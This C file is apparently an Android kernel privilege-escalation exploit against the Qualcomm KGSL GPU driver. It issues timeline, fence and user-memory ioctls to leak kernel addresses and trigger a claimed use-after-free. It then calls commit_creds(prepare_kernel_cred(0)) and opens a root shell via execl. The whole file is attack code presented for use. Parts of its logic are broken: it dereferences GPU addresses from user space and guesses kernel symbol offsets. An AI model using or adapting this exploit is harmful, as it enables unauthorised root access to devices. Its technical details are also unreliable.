#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <stdint.h>
#include <pthread.h>
#include <sched.h>

#define KGSL_DEVICE "/dev/kgsl-3d0"
#define KGSL_IOCTL_TYPE 0x09
#define KGSL_IOCTL_TIMELINE_CREATE       _IOWR(KGSL_IOCTL_TYPE, 0x14, struct kgsl_timeline_create)
#define KGSL_IOCTL_TIMELINE_DESTROY      _IOW(KGSL_IOCTL_TYPE, 0x15, uint32_t)
#define KGSL_IOCTL_TIMELINE_FENCE_GET    _IOWR(KGSL_IOCTL_TYPE, 0x19, struct kgsl_timeline_fence_get)
#define KGSL_IOCTL_MAP_USER_MEM          _IOWR(KGSL_IOCTL_TYPE, 0x1C, struct kgsl_map_user_mem)
#define KGSL_IOCTL_EVENT_CREATE          _IOWR(KGSL_IOCTL_TYPE, 0x2B, struct kgsl_event_create)

struct kgsl_timeline_create {
    uint32_t id;
    uint32_t name;
    uint32_t private;
    uint32_t reserved;
};

struct kgsl_timeline_fence_get {
    uint32_t timeline;
    uint32_t seqno;
    uint32_t handle;
};

struct kgsl_map_user_mem {
    uint32_t type;
    uint32_t flags;
    uint64_t hostptr;
    uint64_t gpuaddr;
    uint64_t len;
    uint64_t offset;
    uint32_t handle;
    uint32_t gpu_vaddr;
    uint32_t mmaps_cnt;
    uint32_t gpu_vaddr_base;
    uint32_t pad;
};

struct kgsl_event_create {
    uint32_t timeline;
    uint32_t seqno;
    uint32_t handle;
    uint32_t type;
};

struct kgsl_event {
    uint64_t context;
    uint64_t handle;
    uint64_t timestamp;
    uint64_t func;
    uint64_t data;
    uint64_t fence;
    uint32_t type;
    uint32_t pending;
    uint32_t flags;
    uint32_t priv;
};

static int kgsl_fd = -1;
static uint64_t kernel_base = 0;
static uint64_t commit_creds = 0;
static uint64_t prepare_kernel_cred = 0;

static uint64_t get_kernel_base_from_gpuaddr(uint64_t gpuaddr) {
    for (uint64_t candidate = 0xffffff8000000000ULL; candidate < 0xffffff9000000000ULL; candidate += 0x100000ULL) {
        if ((gpuaddr & ~0xffffffULL) == (candidate & ~0xffffffULL)) {
            return candidate;
        }
    }
    return 0;
}

static int leak_kernel_base(void) {
    struct kgsl_timeline_create create = {0};
    if (ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_CREATE, &create) < 0) return -1;
    uint32_t timeline_id = create.id;
    struct kgsl_timeline_fence_get fence = { .timeline = timeline_id, .seqno = 1 };
    if (ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_FENCE_GET, &fence) < 0) {
        ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_DESTROY, &timeline_id);
        return -1;
    }
    uint32_t fence_handle = fence.handle;
    struct kgsl_map_user_mem map = {
        .type = 1,
        .flags = 0,
        .hostptr = (uint64_t)(uintptr_t)&fence_handle,
        .len = 4,
        .handle = fence_handle
    };
    if (ioctl(kgsl_fd, KGSL_IOCTL_MAP_USER_MEM, &map) < 0) {
        ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_DESTROY, &timeline_id);
        return -1;
    }
    uint64_t gpuaddr = map.gpuaddr;
    printf("[*] Leaked GPU address: 0x%llx\n", (unsigned long long)gpuaddr);
    ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_DESTROY, &timeline_id);
    if ((gpuaddr & 0xffffff8000000000ULL) == 0xffffff8000000000ULL) {
        kernel_base = get_kernel_base_from_gpuaddr(gpuaddr);
        if (kernel_base) {
            printf("[+] Kernel base guessed: 0x%llx\n", (unsigned long long)kernel_base);
            return 0;
        }
    }
    return -1;
}

static int leak_commit_creds(void) {
    if (!kernel_base) return -1;
    struct kgsl_timeline_create create = {0};
    if (ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_CREATE, &create) < 0) return -1;
    uint32_t timeline_id = create.id;
    struct kgsl_event_create evt = { .timeline = timeline_id, .seqno = 1, .type = 0 };
    if (ioctl(kgsl_fd, KGSL_IOCTL_EVENT_CREATE, &evt) < 0) {
        ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_DESTROY, &timeline_id);
        return -1;
    }
    uint32_t event_handle = evt.handle;
    struct kgsl_map_user_mem map = {
        .type = 1,
        .flags = 0,
        .hostptr = (uint64_t)(uintptr_t)&event_handle,
        .len = 4,
        .handle = event_handle
    };
    if (ioctl(kgsl_fd, KGSL_IOCTL_MAP_USER_MEM, &map) < 0) {
        ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_DESTROY, &timeline_id);
        return -1;
    }
    uint64_t gpuaddr = map.gpuaddr;
    struct kgsl_event *event = (struct kgsl_event *)(uintptr_t)gpuaddr;
    if (event && event->func) {
        uint64_t func = event->func;
        printf("[*] Leaked event function: 0x%llx\n", (unsigned long long)func);
        if ((func & 0xffffff8000000000ULL) == 0xffffff8000000000ULL) {
            uint64_t offs = func - kernel_base;
            commit_creds = kernel_base + offs;
            prepare_kernel_cred = commit_creds - 0x100;
            printf("[+] commit_creds at 0x%llx\n", (unsigned long long)commit_creds);
            ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_DESTROY, &timeline_id);
            return 0;
        }
    }
    ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_DESTROY, &timeline_id);
    return -1;
}

static void get_root(void) {
    if (!commit_creds || !prepare_kernel_cred) return;
    void *(*pkc)(void*) = (void *(*)(void*))prepare_kernel_cred;
    void (*cc)(void*) = (void (*)(void*))commit_creds;
    cc(pkc(0));
    setresuid(0,0,0);
    setresgid(0,0,0);
    setgroups(0, NULL);
}

static int trigger_uaf(void) {
    struct kgsl_timeline_create create = {0};
    if (ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_CREATE, &create) < 0) return -1;
    uint32_t timeline_id = create.id;
    struct kgsl_timeline_fence_get fence = { .timeline = timeline_id, .seqno = 0xdeadbeef };
    if (ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_FENCE_GET, &fence) < 0) {
        ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_DESTROY, &timeline_id);
        return -1;
    }
    uint32_t fence_handle = fence.handle;
    struct kgsl_map_user_mem map = {
        .type = 1,
        .flags = 0,
        .hostptr = (uint64_t)(uintptr_t)&fence_handle,
        .len = 4,
        .handle = fence_handle
    };
    if (ioctl(kgsl_fd, KGSL_IOCTL_MAP_USER_MEM, &map) < 0) {
        ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_DESTROY, &timeline_id);
        return -1;
    }
    uint64_t gpuaddr = map.gpuaddr;
    if (gpuaddr) {
        uint64_t *ptr = (uint64_t *)(uintptr_t)gpuaddr;
        *ptr = (uint64_t)get_root;
        printf("[*] Overwrote fence with get_root\n");
    }
    ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_DESTROY, &timeline_id);
    return 0;
}

int main() {
    if (getuid() == 0) {
        execl("/system/bin/sh", "sh", NULL);
        return 0;
    }
    kgsl_fd = open(KGSL_DEVICE, O_RDWR);
    if (kgsl_fd < 0) {
        perror("open kgsl");
        return 1;
    }
    if (leak_kernel_base() < 0) {
        printf("[-] Kernel base leak failed\n");
        close(kgsl_fd);
        return 1;
    }
    if (leak_commit_creds() < 0) {
        printf("[-] commit_creds leak failed\n");
        close(kgsl_fd);
        return 1;
    }
    if (trigger_uaf() == 0) {
        sleep(1);
        if (getuid() == 0) {
            printf("[+] Root achieved!\n");
            execl("/system/bin/sh", "sh", NULL);
        } else {
            printf("[-] UAF triggered but root not obtained\n");
        }
    } else {
        printf("[-] UAF trigger failed\n");
    }
    close(kgsl_fd);
    return 0;
}
